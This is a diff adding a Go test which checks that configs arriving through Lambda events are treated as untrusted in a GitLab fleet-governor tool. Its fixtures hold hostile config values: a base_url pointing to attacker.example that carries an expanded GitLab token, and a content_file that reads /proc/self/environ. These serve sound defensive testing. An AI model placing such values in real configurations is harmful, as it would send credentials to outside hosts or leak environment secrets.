@@ -12,6 +12,7 @@ import (
 
 	"github.com/aws/aws-sdk-go-v2/service/s3"
 
+	"github.com/divmora/gitlab-fleet-governor/internal/config"
 	"github.com/divmora/gitlab-fleet-governor/internal/lambda"
 )
 
@@ -163,4 +164,73 @@ settings:
 	if cfg.Targets.ProjectSelector == nil || cfg.Targets.ProjectSelector.ProjectNameRegexInclude != "^prod-.*$" {
 		t.Errorf("expected ProjectNameRegexInclude override")
 	}
+}
+
+// Configs supplied by an event are untrusted: they cannot redirect the GitLab
+// client, read local files or expand secrets. The operator's CONFIG_* fallback
+// keeps full expansion.
+func TestConfigResolver_SanitizesEventConfigs(t *testing.T) {
+	env := map[string]string{
+		"GITLAB_TOKEN":    "glpat-operator-secret",
+		"GITLAB_BASE_URL": "https://gitlab.example.com/api/v4",
+	}
+	lookup := func(k string) (string, bool) { v, ok := env[k]; return v, ok }
+
+	evil := []byte("version: \"v1\"\nsettings:\n  gitlab:\n    base_url: \"https://attacker.example/api/v4\"\n    token: \"${GITLAB_TOKEN}\"\n")
+	leak := []byte("version: \"v1\"\npolicies:\n  repository_files:\n    - path: LEAK.txt\n      content_file: \"/proc/self/environ\"\n")
+	mockS3 := &mockS3Client{objects: map[string][]byte{"evil.yaml": evil, "leak.yaml": leak}}
+	resolver := lambda.NewConfigResolver(mockS3, lookup)
+	ctx := context.Background()
+
+	cases := map[string]func() error{
+		"inline content redirects GitLab": func() error {
+			_, _, err := resolver.ResolveFromDirectPayload(ctx, &lambda.DirectInvocationPayload{ConfigContent: string(evil)})
+			return err
+		},
+		"inline object reads a local file": func() error {
+			cfg := &config.PolicyConfig{}
+			cfg.Policies.RepositoryFiles = []config.RepositoryFileConfig{{Path: "LEAK.txt", ContentFile: "/proc/self/environ"}}
+			_, _, err := resolver.ResolveFromDirectPayload(ctx, &lambda.DirectInvocationPayload{Config: cfg})
+			return err
+		},
+		"payload config_s3_uri object": func() error {
+			_, _, err := resolver.ResolveFromDirectPayload(ctx, &lambda.DirectInvocationPayload{ConfigS3URI: "s3://bucket/evil.yaml"})
+			return err
+		},
+		"S3 event object": func() error {
+			_, _, err := resolver.ResolveFromS3URI(ctx, "s3://bucket/leak.yaml")
+			return err
+		},
+	}
+	for name, run := range cases {
+		t.Run(name, func(t *testing.T) {
+			err := run()
+			if err == nil || !strings.Contains(err.Error(), "untrusted configuration rejected") {
+				t.Fatalf("expected untrusted config rejection, got %v", err)
+			}
+		})
+	}
+
+	t.Run("event config cannot expand secrets", func(t *testing.T) {
+		doc := "version: \"v1\"\nsettings:\n  gitlab:\n    token: \"${GITLAB_TOKEN}\"\n"
+		cfg, _, err := resolver.ResolveFromDirectPayload(ctx, &lambda.DirectInvocationPayload{ConfigContent: doc})
+		if err != nil {
+			t.Fatalf("unexpected error: %v", err)
+		}
+		if cfg.Settings.GitLab.Token != "" {
+			t.Fatalf("secret expanded into event config: %q", cfg.Settings.GitLab.Token)
+		}
+	})
+
+	t.Run("operator fallback stays trusted", func(t *testing.T) {
+		env["CONFIG_CONTENT"] = "version: \"v1\"\nsettings:\n  gitlab:\n    token: \"${GITLAB_TOKEN}\"\n"
+		defer delete(env, "CONFIG_CONTENT")
+		cfg, _, err := resolver.ResolveFromDirectPayload(ctx, &lambda.DirectInvocationPayload{})
+		if err != nil {
+			t.Fatalf("unexpected error: %v", err)
+		}
+		if cfg.Settings.GitLab.Token != "glpat-operator-secret" {
+			t.Fatalf("operator config should expand GITLAB_TOKEN, got %q", cfg.Settings.GitLab.Token)
+		}
+	})
 }
